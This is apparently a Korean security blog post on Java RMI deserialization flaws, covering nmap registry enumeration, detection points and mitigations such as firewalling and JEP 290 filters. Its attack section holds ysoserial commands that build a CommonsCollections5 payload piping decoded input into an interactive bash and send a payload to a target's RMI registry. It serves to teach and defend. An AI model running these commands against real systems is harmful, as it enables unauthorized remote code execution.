---
layout: post
title: "Java RMI 취약점과 역직렬화 공격"
date: 2025-09-22
categories: [app-hacking]
tags: [Java RMI, Deserialization, RCE, App Hacking]
description: "Java RMI 서비스의 오설정으로 인한 원격 코드 실행 취약점과 역직렬화 공격 원리 분석"
---

## 1. Java RMI 개요

**Java RMI (Remote Method Invocation)**는 자바 프로그램이 네트워크 상의 다른 자바 가상 머신(JVM)에 있는 객체의 메소드를 호출할 수 있게 해주는 기술입니다.

| 항목 | 내용 |
|------|------|
| 기본 포트 | 1099/tcp |
| 통신 방식 | 직렬화(Serialization) |
| 위험성 | 역직렬화 시 코드 자동 실행 |

---

## 2. 취약점 분석

### 2.1. RMI 레지스트리 열거
```bash
# Nmap으로 RMI 서비스 탐지
nmap -sV --script rmi-dumpregistry -p 1099 <target>
```

### 2.2. 역직렬화(Deserialization) 공격
```bash
# ysoserial로 악성 페이로드 생성
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" > payload.ser

# RMI 서비스로 페이로드 전송
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections5 "whoami"
```

---

## 3. 실습 및 증거

아래는 취약한 Java RMI 서비스에 대해 `nmap` 스크립트를 사용하여 취약점을 진단하고 정보를 수집하는 모습입니다.

![Java RMI Enumeration](/assets/images/att-ck/3.1.5.1.java.png)

---

## 4. 탐지 방법

| 탐지 포인트 | 설명 |
|------------|------|
| 포트 스캔 | 1099 포트 외부 노출 여부 |
| 네트워크 로그 | RMI 프로토콜 트래픽 모니터링 |
| JVM 로그 | 역직렬화 오류/예외 로그 분석 |

---

## 5. 보안 대책

1. **네트워크 격리**: RMI 포트 방화벽 차단
2. **SSL/TLS 적용**: 암호화 및 클라이언트 인증
3. **Security Manager**: 엄격한 보안 정책 적용
4. **라이브러리 업데이트**: 취약한 Commons Collections 등 제거
5. **직렬화 필터**: JEP 290 필터 적용 (JDK 9+)

---

## 6. 참고 도구

| 도구 | 용도 |
|------|------|
| BaRMIe | RMI 서비스 열거 및 공격 |
| ysoserial | 역직렬화 페이로드 생성 |
| nmap rmi-* | RMI 스크립트 스캔 |

<hr class="short-rule">
